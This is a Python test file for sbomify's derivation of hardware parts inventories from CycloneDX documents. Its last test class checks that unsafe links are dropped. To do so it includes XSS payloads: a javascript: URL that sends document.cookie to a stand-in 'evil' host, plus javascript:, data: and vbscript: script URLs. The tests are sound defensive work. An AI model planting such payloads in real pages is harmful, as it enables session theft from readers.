"""Tests for the HBOM hardware-parts inventory derivation."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from sbomify.apps.sboms.hardware_inventory import (
    HardwareInventory,
    HardwarePart,
    derive_hardware_inventory,
    nvd_cpe_url,
)

_DATA = Path(__file__).parent / "test_data"


def _load(name: str) -> dict:
    return json.loads((_DATA / name).read_text())


def _by_name(inventory: HardwareInventory, name: str) -> HardwarePart:
    return next(p for p in inventory.parts if p.name == name)


def _document(*components: dict[str, Any], **extra: Any) -> dict[str, Any]:
    return {"bomFormat": "CycloneDX", "specVersion": "1.6", "components": list(components), **extra}


def test_derives_the_pcie_sata_example():
    inventory = derive_hardware_inventory(_load("hbom_pcie_sata_adapter.cdx.json"))

    # Six board parts. The adaptor board itself is metadata.component — the
    # subject of the document, not a line on its own bill of materials.
    assert inventory.count == 6
    assert inventory.by_type == {"device": 6}
    assert "pcie-sata-adaptor-board" not in {p.name for p in inventory.parts}

    connector = _by_name(inventory, "PCIE-098-02-F-D-EMS2")
    assert connector.manufacturer == "Samtec"
    assert connector.manufacturer_source == "supplier"  # no manufacturer field in the 1.4 example
    assert connector.revision == "2.9.10"
    assert connector.type == "device"
    assert connector.quantity == "1"
    assert connector.function == "connector"
    assert connector.location == "mainboard"
    assert connector.device_type == "thru-hole"
    assert connector.datasheets == ("https://www.samtec.com/products/pcie-098-02-f-d-ems2",)

    molex = _by_name(inventory, "47155-4001")
    assert molex.quantity == "8"
    assert molex.gs1 == (("gtin-12", "822348522712"),)

    # Every part carries the four cdx:device basics the example populates.
    assert all(p.manufacturer and p.quantity and p.function and p.location and p.device_type for p in inventory.parts)


def test_parts_keep_document_order():
    inventory = derive_hardware_inventory(_load("hbom_pcie_sata_adapter.cdx.json"))
    assert [p.bom_ref for p in inventory.parts][:2] == ["PCIE-098-02-F-D-EMS2", "molex-47155-4001"]


def test_component_without_device_properties_still_projects_the_basics():
    inventory = derive_hardware_inventory(
        _document(
            {
                "type": "device",
                "bom-ref": "d1",
                "name": "STM32F407VGT6",
                "version": "rev-C",
                "manufacturer": {"name": "STMicroelectronics"},
            }
        )
    )

    part = inventory.parts[0]
    assert (part.name, part.manufacturer, part.revision, part.type) == (
        "STM32F407VGT6",
        "STMicroelectronics",
        "rev-C",
        "device",
    )
    assert part.manufacturer_source == "manufacturer"
    assert part.quantity is None
    assert part.gs1 == ()
    assert part.certifications == ()


def test_manufacturer_falls_back_supplier_then_publisher():
    inventory = derive_hardware_inventory(
        _document(
            {"type": "device", "name": "a", "manufacturer": {"name": "Maker"}, "supplier": {"name": "Distributor"}},
            {"type": "device", "name": "b", "supplier": {"name": "Distributor"}, "publisher": "Pub"},
            {"type": "device", "name": "c", "publisher": "Pub"},
            {"type": "device", "name": "d"},
            {"type": "device", "name": "e", "manufacturer": {"name": ""}, "supplier": "not-an-object"},
        )
    )

    assert [(p.manufacturer, p.manufacturer_source) for p in inventory.parts] == [
        ("Maker", "manufacturer"),
        ("Distributor", "supplier"),
        ("Pub", "publisher"),
        (None, None),
        (None, None),
    ]


def test_projects_every_cdx_device_property():
    inventory = derive_hardware_inventory(
        _document(
            {
                "type": "device",
                "name": "widget",
                "properties": [
                    {"name": "cdx:device:quantity", "value": "3"},
                    {"name": "cdx:device:function", "value": "sensor"},
                    {"name": "cdx:device:location", "value": "daughterboard"},
                    {"name": "cdx:device:deviceType", "value": "smd"},
                    {"name": "cdx:device:sku", "value": "SKU-9"},
                    {"name": "cdx:device:serialNumber", "value": "SN-1234"},
                    {"name": "cdx:device:lotNumber", "value": "LOT-7"},
                    {"name": "cdx:device:prodTimestamp", "value": "2024-03-01"},
                    {"name": "cdx:device:macAddress", "value": "00:1b:44:11:3a:b7"},
                    {"name": "cdx:device:gs1:gtin-13", "value": "4006381333931"},
                    {"name": "cdx:device:gs1:epcRfid", "value": "urn:epc:id:sgtin:0614141.112345.400"},
                ],
            }
        )
    )

    part = inventory.parts[0]
    assert part.quantity == "3"
    assert part.function == "sensor"
    assert part.location == "daughterboard"
    assert part.device_type == "smd"
    assert part.sku == "SKU-9"
    assert part.serial_number == "SN-1234"
    assert part.lot_number == "LOT-7"
    assert part.prod_timestamp == "2024-03-01"
    assert part.mac_address == "00:1b:44:11:3a:b7"
    assert dict(part.gs1) == {
        "gtin-13": "4006381333931",
        "epcRfid": "urn:epc:id:sgtin:0614141.112345.400",
    }


def test_parses_structured_certification_keys():
    inventory = derive_hardware_inventory(
        _document(
            {
                "type": "device",
                "name": "radio",
                "properties": [
                    {"name": "cdx:device:certifications:US:FCC:id", "value": "2AB3C-XYZ"},
                    {"name": "cdx:device:certifications:US:FCC:url", "value": "https://example.test/fcc"},
                    {"name": "cdx:device:certifications:DE:BNetzA:id", "value": "D-1234"},
                    # Missing the id|url segment, and a bare prefix: neither is a certification.
                    {"name": "cdx:device:certifications:JP", "value": "ignored"},
                    {"name": "cdx:device:certifications:JP:MIC:unknown", "value": "ignored"},
                ],
            }
        )
    )

    certifications = {(c.country, c.authority): c for c in inventory.parts[0].certifications}
    assert set(certifications) == {("US", "FCC"), ("DE", "BNetzA")}
    assert certifications[("US", "FCC")].identifier == "2AB3C-XYZ"
    assert certifications[("US", "FCC")].url == "https://example.test/fcc"
    assert certifications[("DE", "BNetzA")].identifier == "D-1234"
    assert certifications[("DE", "BNetzA")].url is None


def test_links_firmware_through_the_dependency_graph():
    inventory = derive_hardware_inventory(
        _document(
            {"type": "device", "bom-ref": "mcu", "name": "MCU"},
            {"type": "firmware", "bom-ref": "fw", "name": "bootloader", "version": "2.1"},
            {"type": "device", "bom-ref": "led", "name": "LED"},
            dependencies=[
                {"ref": "mcu", "dependsOn": ["fw", "led", "mcu", 7, "missing"]},
                {"ref": "led", "dependsOn": []},
                "not-a-dependency",
            ],
        )
    )

    assert _by_name(inventory, "MCU").firmware == ("bootloader 2.1",)
    assert _by_name(inventory, "LED").firmware == ()
    # The firmware component is itself a part — it is a hardware-document type.
    assert inventory.by_type == {"device": 2, "firmware": 1}


def test_ignores_software_components():
    inventory = derive_hardware_inventory(
        _document(
            {"type": "library", "name": "left-pad"},
            {"type": "device", "name": "board"},
            {"type": "operating-system", "name": "linux"},
        )
    )
    assert [p.name for p in inventory.parts] == ["board"]


def test_cpe_becomes_an_nvd_lookup_url():
    url = nvd_cpe_url("cpe:2.3:h:intel:core_i7:-:*:*:*:*:*:*:*")
    assert url.startswith("https://nvd.nist.gov/vuln/search/results?")
    assert "isCpeNameSearch=true" in url
    assert "query=cpe%3A2.3%3Ah%3Aintel%3Acore_i7" in url  # the CPE is URL-encoded, not interpolated raw


@pytest.mark.parametrize("cpe", ["cpe:/h:intel:core_i7", "cpe:2.3:h:intel", "not a cpe", ""])
def test_a_cpe_that_is_not_a_2_3_name_falls_back_to_keyword_search(cpe: str):
    # A CPE-name search errors on anything but a well-formed 2.3 name.
    assert "isCpeNameSearch" not in nvd_cpe_url(cpe)


@pytest.mark.parametrize(
    "document",
    [
        None,
        "not-a-document",
        {},
        {"components": "not-a-list"},
        {"components": []},
        {"components": [None, "junk", 7]},
        # A property bag that is not a list, entries that are not dicts, entries
        # missing name or value, and structured values where a string belongs.
        {"components": [{"type": "device", "name": "a", "properties": "nope"}]},
        {"components": [{"type": "device", "name": "a", "properties": {"cdx:device:sku": "x"}}]},
        {"components": [{"type": "device", "name": "a", "properties": [None, 1, "x"]}]},
        {"components": [{"type": "device", "name": "a", "properties": [{"value": "orphan"}]}]},
        {"components": [{"type": "device", "name": "a", "properties": [{"name": "cdx:device:sku"}]}]},
        {"components": [{"type": "device", "name": "a", "properties": [{"name": 7, "value": {"a": 1}}]}]},
        {"components": [{"type": "device", "name": "a", "properties": [{"name": "cdx:device:gs1:", "value": "x"}]}]},
        {"components": [{"type": "device", "name": {"nested": "name"}, "version": ["1"], "cpe": 7}]},
        {"components": [{"type": "device", "externalReferences": "nope"}]},
        {"components": [{"type": "device", "externalReferences": [None, {"type": "documentation"}]}]},
        {"components": [{"type": "device", "bom-ref": "a"}], "dependencies": "nope"},
        {"components": [{"type": "device", "bom-ref": "a"}], "dependencies": [{"ref": "a", "dependsOn": "nope"}]},
    ],
)
def test_malformed_documents_never_raise(document: Any):
    inventory = derive_hardware_inventory(document)
    assert isinstance(inventory, HardwareInventory)
    assert isinstance(inventory.by_type, dict)


def test_first_property_of_a_duplicated_name_wins():
    inventory = derive_hardware_inventory(
        _document(
            {
                "type": "device",
                "name": "a",
                "properties": [
                    {"name": "cdx:device:quantity", "value": "2"},
                    {"name": "cdx:device:quantity", "value": "999"},
                ],
            }
        )
    )
    assert inventory.parts[0].quantity == "2"


class TestUploaderControlledUrls:
    """ADR-004 stores an artifact exactly as received, so a document can carry a
    javascript: URL and the renderer is the only thing between it and a reader —
    an anonymous one, on a public product."""

    def _part(self, doc: dict) -> object:
        return derive_hardware_inventory(doc).parts[0]

    def test_a_javascript_datasheet_is_dropped(self) -> None:
        part = self._part(
            {
                "components": [
                    {
                        "type": "device",
                        "name": "STM32",
                        "externalReferences": [
                            {"type": "documentation", "url": "javascript:fetch('//evil/'+document.cookie)"},
                            {"type": "documentation", "url": "https://st.com/datasheet.pdf"},
                        ],
                    }
                ]
            }
        )

        assert part.datasheets == ("https://st.com/datasheet.pdf",)

    def test_a_javascript_certification_url_is_dropped_but_the_id_is_kept(self) -> None:
        """The approval identifier is still evidence; only the link is unusable."""
        part = self._part(
            {
                "components": [
                    {
                        "type": "device",
                        "name": "STM32",
                        "properties": [
                            {"name": "cdx:device:certifications:US:FCC:url", "value": "javascript:alert(1)"},
                            {"name": "cdx:device:certifications:US:FCC:id", "value": "FCC-123"},
                        ],
                    }
                ]
            }
        )

        certification = part.certifications[0]
        assert certification.identifier == "FCC-123"
        assert certification.url is None

    @pytest.mark.parametrize(
        "scheme",
        ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>", "vbscript:msgbox(1)", "/relative/path"],
    )
    def test_only_absolute_http_and_mailto_links_survive(self, scheme: str) -> None:
        """A relative path is rejected too: a supplier datasheet is absolute by
        definition, and a bare path would resolve against sbomify's own origin."""
        part = self._part(
            {
                "components": [
                    {"type": "device", "name": "p", "externalReferences": [{"type": "documentation", "url": scheme}]}
                ]
            }
        )

        assert part.datasheets == ()
